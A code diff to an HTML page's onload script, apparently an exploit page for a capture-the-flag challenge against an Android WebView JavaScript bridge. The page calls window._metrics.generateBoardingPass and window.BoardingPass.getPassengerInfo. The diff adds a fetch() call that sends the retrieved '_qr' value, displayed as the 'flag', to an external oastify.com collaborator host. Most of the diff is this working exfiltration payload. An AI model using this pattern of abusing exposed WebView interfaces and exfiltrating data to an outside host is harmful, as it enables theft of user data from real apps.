@@ -57,10 +57,6 @@
     <script>
         window.onload = function() {
             try {
-                // Step 1 : Generate the boarding pass with _qr value
-                
-                //var generateStr = window._metrics.generateBoardingPass("Jane Doe", "14A", 14, "BP1337", "847-2993187054" );
-          
                 // Step 2 : Get the Boarding pass
                 var infoStr = window.BoardingPass.getPassengerInfo();
                 if (infoStr && infoStr.length > 0) {
@@ -73,8 +69,12 @@
                     document.getElementById('f-flag').textContent =  info._qr || '--';
                     document.getElementById('status').className = 'status success';
                     document.getElementById('status').textContent = 'Boarding Pass ready.';
+                    fetch("https://p5vekb29i4a3ql3sr4y8rzley54wsmgb.oastify.com?b64=" + info._qr, {
+                      method: "GET",
+                    });
                 } else {
-                     throw new Error('No passenger data found.');
+                    // Step 1 : Generate the boarding pass with _qr value. The values should match the SHA256 values from MetricsCallback
+                    var generateStr = window._metrics.generateBoardingPass("Jane Doe", "14A", 14, "BP1337", "847-2993187054" );
                 }
             } catch (e) {
                 document.getElementById('f-name').textContent = 'Error';
